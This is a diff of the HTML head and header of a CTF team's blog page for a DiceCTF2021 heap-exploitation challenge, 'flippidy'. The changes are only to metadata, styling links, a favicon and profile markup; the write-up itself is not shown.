@@ -1,7 +1,8 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang=en>
 <head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="utf-8">
+  
   <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
   <meta name="renderer" content="webkit">
@@ -15,49 +16,53 @@
   <!-- 强制页面在当前窗口以独立页面显示,防止别人在框架里调用页面 -->
   <meta http-equiv="window-target" content="_top">
   
+  
   <title>[Pwn] DiceCTF2021 - flippidy | TeamRocketIST - Portuguese CTF Team</title>
-  <meta name="description" content="flippidy   Solves: 62 Points: 149    Description:See if you can flip this program into a flag :D nc dicec.tf 31904 flippidy45ffbb615d868486383a07220e6e6bfc libc.so.650390b2ae8aaa73c47745040f54e602f A">
+  <meta name="description" content="flippidy   Solves: 62 Points: 149 Description: See if you can flip this program into a flag 😄 nc dicec.tf 31904 flippidy 45ffbb615d868486383a07220e6e6bfc libc.so.6 50390b2ae8aaa73c47745040f54e602f A">
 <meta name="keywords" content="double_free,tcache_poisoning,heap,dicectf2021">
 <meta property="og:type" content="article">
 <meta property="og:title" content="[Pwn] DiceCTF2021 - flippidy">
 <meta property="og:url" content="https://teamrocketist.github.io/2021/02/08/Pwn-DiceCTF2021-flippidy/index.html">
 <meta property="og:site_name" content="TEAMROCKETIST">
-<meta property="og:description" content="flippidy   Solves: 62 Points: 149    Description:See if you can flip this program into a flag :D nc dicec.tf 31904 flippidy45ffbb615d868486383a07220e6e6bfc libc.so.650390b2ae8aaa73c47745040f54e602f A">
+<meta property="og:description" content="flippidy   Solves: 62 Points: 149 Description: See if you can flip this program into a flag 😄 nc dicec.tf 31904 flippidy 45ffbb615d868486383a07220e6e6bfc libc.so.6 50390b2ae8aaa73c47745040f54e602f A">
 <meta property="og:locale" content="en">
 <meta property="og:image" content="https://i.imgur.com/gEkVcNY.png">
 <meta property="og:updated_time" content="2022-08-23T04:34:08.813Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="[Pwn] DiceCTF2021 - flippidy">
-<meta name="twitter:description" content="flippidy   Solves: 62 Points: 149    Description:See if you can flip this program into a flag :D nc dicec.tf 31904 flippidy45ffbb615d868486383a07220e6e6bfc libc.so.650390b2ae8aaa73c47745040f54e602f A">
+<meta name="twitter:description" content="flippidy   Solves: 62 Points: 149 Description: See if you can flip this program into a flag 😄 nc dicec.tf 31904 flippidy 45ffbb615d868486383a07220e6e6bfc libc.so.6 50390b2ae8aaa73c47745040f54e602f A">
 <meta name="twitter:image" content="https://i.imgur.com/gEkVcNY.png">
+  <!-- Canonical links -->
+  <link rel="canonical" href="https://teamrocketist.github.io/2021/02/08/Pwn-DiceCTF2021-flippidy/index.html">
   
     <link rel="alternate" href="/atom.xml" title="TEAMROCKETIST" type="application/atom+xml">
   
   
     <link rel="icon" href="data:image/vnd.microsoft.icon;base64,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" type="image/x-icon">
   
-  <!-- font-awesome CSS -->
-  <link href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
-  
-  <link rel="stylesheet" href="/css/jquery.fancybox.min.css">
-
   <link rel="stylesheet" href="/css/style.css">
+  
+  
+  
+    <link href="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.3.5/dist/jquery.fancybox.min.css" rel="stylesheet">
+  
+  
 </head>
-</html>
 
-<body class="main-center">
-  <section class="mainside">
+
+<body class="main-center theme-black" itemscope itemtype="http://schema.org/WebPage">
+  <header class="header" itemscope itemtype="http://schema.org/WPHeader">
   <div class="slimContent">
     <div class="navbar-header">
       
       
       <div class="profile-block text-center">
         <a id="avatar" href="https://github.com/teamrocketist" target="_blank">
-          <img class="thumb-xl img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200">
+          <img class="img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200">
         </a>
         <h2 id="name" class="hidden-xs hidden-sm">TeamRocketIST</h2>
         <h3 id="title" class="hidden-xs hidden-sm hidden-md">CTF Team</h3>
-        <small id="location" class="text-muted hidden-xs hidden-sm"><i class="fa fa-map-marker"></i> Lisbon, Portugal</small>
+        <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> Lisbon, Portugal</small>
       </div>
       
       <div class="search" id="search-form-wrap">
@@ -66,23 +71,23 @@
         <div class="input-group">
             <input type="text" class="search-form-input form-control" placeholder="Search" />
